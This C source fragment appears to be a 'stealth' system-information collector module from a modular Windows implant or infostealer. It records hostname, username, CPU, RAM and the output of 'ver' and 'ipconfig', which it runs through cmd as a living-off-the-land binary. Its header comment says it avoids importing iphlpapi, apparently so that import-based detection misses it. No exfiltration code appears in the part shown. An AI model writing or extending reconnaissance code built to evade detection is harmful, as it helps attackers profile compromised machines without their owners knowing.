// chunk: collectors/system_info_stealth
// depends: core/emit_buffer, core/run_cmd
// provides: collect_system_info
// note: API-based hostname/username + LOLBin ver+ipconfig — no iphlpapi import

#ifndef CHUNK_SYSTEM_INFO_STEALTH
#define CHUNK_SYSTEM_INFO_STEALTH

static void collect_system_info(void) {
    emitf("=== SYSTEM INFO ===\r\n");

    char hostname[256] = {0};
    DWORD hlen = sizeof(hostname);
    if (GetComputerNameA(hostname, &hlen))
        emitf("Hostname: %s\r\n", hostname);

    char *user = getenv("USERNAME");
    if (user) emitf("Username: %s\r\n", user);

    char out[8192] = {0};
    DWORD len = 0;
    run_cmd("cmd /c \"ver && ipconfig\"", out, sizeof(out), &len);
    if (len > 0) emitf("OS:\r\n%s", out);

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    emitf("Arch: %s  CPUs: %lu\r\n",
          si.wProcessorArchitecture == 9 ? "x64" :
          si.wProcessorArchitecture == 12 ? "ARM64" : "x86",
          si.dwNumberOfProcessors);

    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    if (GlobalMemoryStatusEx(&ms))
        emitf("RAM: %llu MB\r\n", ms.ullTotalPhys / (1024 * 1024));

    emitf("\r\n");
}

#endif
